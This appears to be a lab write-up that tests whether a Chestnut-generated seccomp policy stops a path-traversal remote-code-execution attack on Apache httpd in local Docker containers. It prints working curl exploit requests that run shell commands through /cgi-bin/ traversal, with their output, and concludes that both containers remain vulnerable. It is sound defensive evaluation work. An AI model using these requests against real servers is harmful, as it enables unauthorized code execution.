## Apache httpd – chestnut

./build.sh
docker compose up -d

### Preparation

For the seccomp container we follow these steps, to create a policy for the `httpd` binary and apply it:

1. Enter the seccomp container:
   `docker exec -it http-chestnut-seccomp-container "bash`

2. Run following commands inside the container. After executing `rewrite.sh` the binary will get executed:

```
mkdir /tool/Chestnut/Binalyzer/cached_results/
sed -i 's/from cfg import cached_results_folder/cached_results_folder = "cached_results"/' /tool/Chestnut/Binalyzer/syscalls.py
cd /tool/Chestnut/Binalyzer
python3 /tool/Chestnut/Binalyzer/syscalls.py /opt/apache/bin/httpd
python3 /tool/Chestnut/Binalyzer/policy.py /opt/apache/bin/httpd
cp /tool/Chestnut/Binalyzer/cached_results/policy__opt_apache_bin_httpd.json /tool/Chestnut/ChestnutPatcher/
cd /tool/Chestnut/ChestnutPatcher && make
/tool/Chestnut/ChestnutPatcher/rewrite.sh /opt/apache/bin/httpd
```

For the container without seccomp, we just have to start it with following command:
`docker exec -it http-chestnut-normal-container "/opt/apache/bin/httpd"`

### Conduct the exploits

First, we verify the IP addresses of the container, to ensure we target the right containers:

```
❯ docker ps
CONTAINER ID   IMAGE                      COMMAND       CREATED          STATUS          PORTS                                                                                  NAMES
74a0ff93c31a   http-chestnut-seccomp      "bash"        36 seconds ago   Up 35 seconds   0.0.0.0:8083->80/tcp, [::]:8083->80/tcp                                                http-chestnut-seccomp-container
c4bb89d13ae4   http-chestnut-normal       "bash"        36 seconds ago   Up 35 seconds   0.0.0.0:8084->80/tcp, [::]:8084->80/tcp
```

_Seccomp_:

The attack on the container with the applied seccomp profile succeeds:

```
❯ curl 'http://localhost:8083/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami'  -H "Content-Type: text/plain"
daemon
❯ curl 'http://localhost:8083/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; id'  -H "Content-Type: text/plain"
uid=1(daemon) gid=1(daemon) groups=1(daemon)
❯ curl 'http://localhost:8083/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; ls|head'  -H "Content-Type: text/plain"
bash
bunzip2
bzcat
bzcmp
bzdiff
bzegrep
bzexe
bzfgrep
bzgrep
bzip2
❯ curl 'http://localhost:8083/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; pwd'  -H "Content-Type: text/plain"
/bin
```

```
❯ curl 'http://localhost:8083/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami' -H "Content-Type: text/plain"
daemon
❯ curl 'http://localhost:8083/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; id' -H "Content-Type: text/plain"
uid=1(daemon) gid=1(daemon) groups=1(daemon)
❯ curl 'http://localhost:8083/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; ls|head' -H "Content-Type: text/plain"
bash
bunzip2
bzcat
bzcmp
bzdiff
bzegrep
bzexe
bzfgrep
bzgrep
bzip2
❯ curl 'http://localhost:8084/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; pwd' -H "Content-Type: text/plain"
/bin
```

### Analysis

Both containers are still vulnerable!

The used seccomp policy `policy__opt_apache_bin_httpd.json`:

```
{"version": 1, "syscalls": [0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 202, 203, 204, 213, 216, 218, 220, 221, 227, 228, 229, 230, 231, 232, 233, 234, 235, 247, 253, 254, 255, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 275, 276, 277, 278, 280, 281, 283, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 318, 319, 322, 325, 326, 327, 328, 329, 330, 331]}
```
